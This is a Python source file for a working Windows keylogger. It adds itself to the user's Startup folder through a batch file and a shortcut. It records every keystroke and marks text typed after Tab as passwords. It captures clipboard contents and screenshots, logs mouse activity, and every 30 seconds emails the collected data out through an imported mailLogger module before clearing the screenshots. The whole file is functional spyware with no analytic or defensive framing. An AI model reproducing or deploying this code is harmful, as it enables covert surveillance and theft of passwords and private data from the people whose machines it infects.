import os
import pyscreenshot
from tkinter import Tk
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Key ,KeyCode,GlobalHotKeys
import time
import threading
from mailLogger import SendMail
import win32api,win32con
import win32com.client
from win32gui import GetWindowText, GetForegroundWindow
import getpass
from pathlib import Path


USER_NAME = getpass.getuser() #Getting the specific Windows user

#A function that enters the file name to the open.bat file
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = Path(__file__).absolute() #Getting the main file path

    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    #opens the open.bat file and write the start string
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)

#A function that creates a shortcut of the main file in the Windows Startup folder
def add_keylogger_shortcut():
    file_path = Path(__file__).absolute() #Getting the main file path
    folder_path = os.path.abspath(os.getcwd()) #Getting the main folder path

    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

    path = os.path.join(bat_path, 'Keylogger.lnk')

    target = str(file_path) #the target file
    icon = str(file_path) #the target file icon

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target #enter the shortcut Targetpath
    shortcut.WorkingDirectory = str(folder_path) #enter the shortcut WorkingDirectory
    shortcut.IconLocation = icon #enter the shortcut icon
    shortcut.save()

add_to_startup()
add_keylogger_shortcut()

# Path
global path
path = './screenshot/'

global intrevel
intrevel = 30

global imageNumber
imageNumber = 0

#A function that takes screen shoot
def takeScreenshoot(path):
    global imageNumber
    image = pyscreenshot.grab() #screenshot
    file_path = path + "Screenshoot_" + str(imageNumber) + ".png"
    # To save the screenshot
    image.save(file_path)
    imageNumber += 1

#A function that clean the Directory
def cleanDirectory(path):
    for file in os.listdir(path):
        os.remove(path + file)
        # print(file)
    print('File Cleaned...')


if not os.path.isdir(path):
    os.mkdir(path) #Creating the folder

count = 0

def on_press(key):
    caps_status = win32api.GetKeyState(win32con.VK_CAPITAL) #getting cas_lock status
    with open('keys.txt', 'a') as file:
        if key == Key.esc:
            return False
        elif key == Key.enter: #Checking if key is Enter
            takeScreenshoot(path)
            print('ScreenShoot Taken')
            file.write("\nKey-Enter\n")
        elif key == Key.tab:
            file.write("\nPassword: ")
        elif str(key) == r"'\x03'": #Checking if key is Ctrl-c
            file.write("\nCtrl-c")

            data = Tk().clipboard_get() # text will have the content of clipboard
            if (data):
                with open('clipboard.txt', 'a') as file:
                    file.write("Clipboard : {0}  at : [{1}]\n".format(data, time.strftime(' %d %b %Y %H:%M:%S '))) # writes to the Clipboard the time and data of the clipboard

        elif str(key) == r"'\x16'": #Checking if  key is Ctrl-v
            file.write("\nCtrl-v")
            with open('clipboard.txt', 'a', errors='ignore') as file:
                # Saving the place in windows with the attachment of the clipboard
                file.write("The user pasted the clipboard here: " + GetWindowText(GetForegroundWindow()) + "\n")

        elif key == Key.ctrl:
            file.write("")
        elif key == Key.ctrl_l:
            file.write("")
        elif key == Key.space:
            file.write(" ")
        elif key == Key.shift:
            file.write("")
        elif key == Key.caps_lock:
            file.write("")
        elif caps_status == 1:
            file.write("{0}".format(str(key).strip("'").upper()))
        else:
            file.write("{0}".format(str(key).strip("'")))

# Writes the mouse movement to the keys.txt file
def on_move(x, y):
    global count
    count += 1
    if count <= 20:
        with open('keys.txt', 'a') as file:
            file.write('position of mouse: {0}  at :[{1}]\n'.format((x, y), time.strftime(' %d %b %Y %H:%M:%S ')))

# Writes the mouse clicks to the keys.txt file
def on_click(x, y, button, pressed):
    global path
    if pressed:
        with open('keys.txt', 'a') as file:
            file.write('\nMouse clicked at ({0}, {1}) with {2}  at :[{3}]\n'.format(x, y, button,
                                                                                  time.strftime(' %d %b %Y %H:%M:%S ')))
# Writes the mouse scroll movement to the keys.txt file
def on_scroll(x, y, dx, dy):
    with open('keys.txt', 'a') as file:
        file.write('Mouse scrolled at ({0}, {1})({2}, {3})  at :[{4}]\n'.format(x, y, dx, dy,
                                                                                time.strftime(' %d %b %Y %H:%M:%S ')))

#A function the activates the SendMail funcion in the mailLogger file
def report():
    global path, intrevel
    SendMail()
    print('Mail Sent')
    cleanDirectory(path)
    timer = threading.Timer(intrevel, report)
    timer.start()

#The Listeners
with MouseListener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
    with KeyboardListener(on_press=on_press) as listener:
        report()
        listener.join()


